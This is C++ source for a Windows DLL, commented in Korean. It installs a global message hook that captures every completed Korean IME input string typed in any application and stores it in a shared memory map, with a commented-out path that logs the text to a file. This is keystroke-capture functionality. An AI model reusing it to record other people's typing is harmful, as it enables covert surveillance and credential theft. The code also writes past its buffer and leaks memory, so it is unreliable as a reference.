#pragma comment(lib, "Imm32.lib")
// dllmain.cpp : DLL 응용 프로그램의 진입점을 정의합니다.
#include "stdafx.h"
#include "windows.h"
#include "imm.h"
#include <stdlib.h>
#define IsHangle(c)  ((unsigned char)(c) > 0x7f)
#define WM_LETTER_MSG WM_USER+6

HHOOK 		hHook = NULL;
HINSTANCE 	hHookDll;
HWND hCaller = NULL;
LRESULT CALLBACK GetMsgProc(int code,  WPARAM wParam,  LPARAM lParam);


//Dll 로딩해서 호출 할 수 있는 메소드들
extern "C"_declspec(dllexport) void SetHookProc(HWND hWnd);
extern "C"_declspec(dllexport) void UnsetHookProc();

BOOL APIENTRY DllMain( HANDLE hModule, 
                       DWORD  ul_reason_for_call, 
                       LPVOID lpReserved
					 )
{
hHookDll = (HINSTANCE )hModule;
    	return TRUE;
}
_declspec(dllexport) void SetHookProc(HWND hWnd)
{
	hHook =  SetWindowsHookEx(WH_GETMESSAGE,GetMsgProc,hHookDll,0);	//메세지 후킹 셋팅
	hCaller=hWnd;
}

_declspec(dllexport) void UnsetHookProc()
{
	UnhookWindowsHookEx(hHook);
}

char *ch;
DWORD last=0;
LRESULT CALLBACK GetMsgProc(int code,  WPARAM wParam,  LPARAM lParam)
{
	LRESULT lResult=CallNextHookEx(hHook, code,  wParam, lParam);
   	MSG *msg = (MSG *)lParam;
	//WM_IME_COMPOSITION 메세지의 파라미터가 GCS_RESULTSTR라는건 한글 한 글자가 발생했다는 뜻.
	if (msg->lParam==GCS_RESULTSTR&&msg->time!=last )// msg->message == WM_IME_COMPOSITION 생략
   	{	
		last=msg->time;//한글자 중복발생 배제를 위함
		HIMC hIMC;
		DWORD dwSize;
        
		hIMC = ImmGetContext(msg->hwnd);
		dwSize = ImmGetCompositionString(hIMC, GCS_RESULTSTR, NULL, 0);	//현재 글자의 사이즈 얻어옴
		
		ch=new char[dwSize];	//얻어온 사이즈로 배열 생성하고
        ImmGetCompositionString(hIMC, GCS_RESULTSTR, ch, dwSize);	//배열에 현재 글자 씀
		ch[dwSize]=(char)0;	//마지막은 널문자로
		//ch[dwSize+1]=(char)0;//유니코드면
		ImmReleaseContext(msg->hwnd, hIMC);
		/*	파일로 글자 출력부분. 테스트에서 쓰임.
		FILE* f1;
        f1=fopen("c://report.txt","a+");
		fwrite(ch,dwSize,1,f1);
        fclose(f1);    
		*/
		
		//메모리맵파일에 얻어온 글자 쓰기
		HANDLE hMapFile3;
		hMapFile3=CreateFileMapping(INVALID_HANDLE_VALUE,NULL,PAGE_READWRITE,0,sizeof(char)*40,"Alarme_TypedWord");
		char* mapFile=(char*)MapViewOfFile(hMapFile3,FILE_MAP_ALL_ACCESS,0,0,sizeof(char)*40);
		int len=strlen(mapFile);
		int cut=0;
		if(len>34){	//메모리에 입력문자 무한정 기록하는걸 방지하기 위해 34가 넘으면 앞부분을 버릴것임
			char append[40];
			while(1){	//자르고 버릴때 2바이트 문자가 안깨지게 하기 위함
				if(IsHangle(mapFile[cut]))cut+=2;	//한글이면 두바이트 다음
				else cut++;	//아니면 한바이트 다음
				if(cut>20) break;	//자를 위치 확정
			}
			strcpy(append,&mapFile[cut]);	//자름
			strcpy(mapFile,append);	//자른 문자열을 맵파일에 씀
		}
		strcat(mapFile,ch);	//현재 입력된 문자열을 그 뒤에 추가

		UnmapViewOfFile(mapFile);

   	} 
   	return lResult;
}